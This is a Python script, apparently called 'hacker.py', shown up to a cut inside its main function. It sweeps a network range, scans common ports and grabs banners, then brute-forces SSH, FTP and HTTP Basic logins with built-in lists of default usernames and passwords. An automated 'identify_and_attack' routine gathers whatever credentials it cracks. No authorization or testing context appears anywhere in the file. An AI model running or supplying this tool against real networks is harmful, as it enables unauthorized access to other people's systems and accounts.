import sys
import os
import socket
import struct
import threading
import queue
import time
import subprocess
from typing import List, Tuple, Dict, Optional

# Optional modules
try:
    import paramiko
except:
    paramiko = None
try:
    import requests
except:
    requests = None

# Basic TCP port scanner with banner grabbing
COMMON_PORTS = [22, 21, 80, 443, 445, 3389, 5900, 8080, 8000, 8443, 23, 25, 110, 1433, 3306, 5432]

def scan_port(ip: str, port: int, timeout: float = 1.0) -> Tuple[bool, Optional[str]]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        try:
            s.sendall(b"\r\n")
        except:
            pass
        banner = None
        try:
            banner = s.recv(1024).decode(errors='ignore')
        except:
            banner = None
        return True, banner
    except:
        return False, None
    finally:
        try:
            s.close()
        except:
            pass

def scan_host(ip: str, ports: List[int]) -> Dict[int, Dict[str, Optional[str]]]:
    results = {}
    for port in ports:
        open_, banner = scan_port(ip, port)
        if open_:
            results[port] = {"open": True, "banner": banner}
    return results

def ping_host(ip: str, timeout: float = 0.5) -> bool:
    try:
        # cross-platform ping using subprocess
        if os.name == 'nt':
            cmd = ["ping", "-n", "1", "-w", str(int(timeout*1000)), ip]
        else:
            cmd = ["ping", "-c", "1", "-W", str(int(timeout)), ip]
        res = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return res.returncode == 0
    except:
        return False

def cidr_to_ips(cidr: str) -> List[str]:
    # Supports IPv4 only
    addr, prefix = cidr.split("/")
    prefix = int(prefix)
    packed_ip = struct.unpack("!I", socket.inet_aton(addr))[0]
    mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF
    network = packed_ip & mask
    broadcast = network | (~mask & 0xFFFFFFFF)
    ips = []
    for i in range(network + 1, broadcast):
        ips.append(socket.inet_ntoa(struct.pack("!I", i)))
    return ips

def discover_hosts(cidr: str, threads: int = 64) -> List[str]:
    ips = cidr_to_ips(cidr)
    q = queue.Queue()
    for ip in ips:
        q.put(ip)
    alive = []
    lock = threading.Lock()
    def worker():
        while True:
            try:
                ip = q.get_nowait()
            except:
                break
            if ping_host(ip):
                with lock:
                    alive.append(ip)
            q.task_done()
    ths = []
    for _ in range(min(threads, len(ips))):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        ths.append(t)
    for t in ths:
        t.join()
    return alive

def brute_ssh(ip: str, userlist: List[str], passlist: List[str], timeout: float = 3.0) -> Optional[Tuple[str, str]]:
    if paramiko is None:
        return None
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for user in userlist:
        for pwd in passlist:
            try:
                client.connect(ip, username=user, password=pwd, timeout=timeout, banner_timeout=timeout, auth_timeout=timeout)
                return user, pwd
            except:
                continue
    return None

def brute_ftp(ip: str, userlist: List[str], passlist: List[str], timeout: float = 3.0) -> Optional[Tuple[str, str]]:
    import ftplib
    for user in userlist:
        for pwd in passlist:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, 21, timeout=timeout)
                ftp.login(user, pwd)
                ftp.quit()
                return user, pwd
            except:
                try:
                    ftp.close()
                except:
                    pass
                continue
    return None

def brute_http_basic(ip: str, port: int, userlist: List[str], passlist: List[str], timeout: float = 3.0) -> Optional[Tuple[str, str]]:
    if requests is None:
        return None
    base = f"http://{ip}:{port}/"
    for user in userlist:
        for pwd in passlist:
            try:
                r = requests.get(base, auth=(user, pwd), timeout=timeout, verify=False)
                if r.status_code != 401:
                    return user, pwd
            except:
                continue
    return None

def identify_and_attack(ip: str, open_ports: Dict[int, Dict[str, Optional[str]]], userlist: List[str], passlist: List[str]) -> Dict[str, Optional[Tuple[str, str]]]:
    creds = {}
    # SSH
    if 22 in open_ports:
        c = brute_ssh(ip, userlist, passlist)
        if c:
            creds["ssh"] = c
    # FTP
    if 21 in open_ports:
        c = brute_ftp(ip, userlist, passlist)
        if c:
            creds["ftp"] = c
    # HTTP Basic
    for p in [80, 8080, 8000]:
        if p in open_ports:
            c = brute_http_basic(ip, p, userlist, passlist)
            if c:
                creds[f"http:{p}"] = c
    return creds

def main():
    if len(sys.argv) < 2:
        print("Usage: python hacker.py <CIDR> [userlist] [passlist]")
        sys.exit(1)
    cidr = sys.argv[1]
    userlist = ["admin", "root", "user", "test"]
    passlist = ["admin", "root", "password", "123456", "12345", "test", "qwerty", "letmein"]
    if len(sys.argv) >= 3:
        with open(sys.argv[2], "r", encoding="utf-8", errors="ignore") as f:
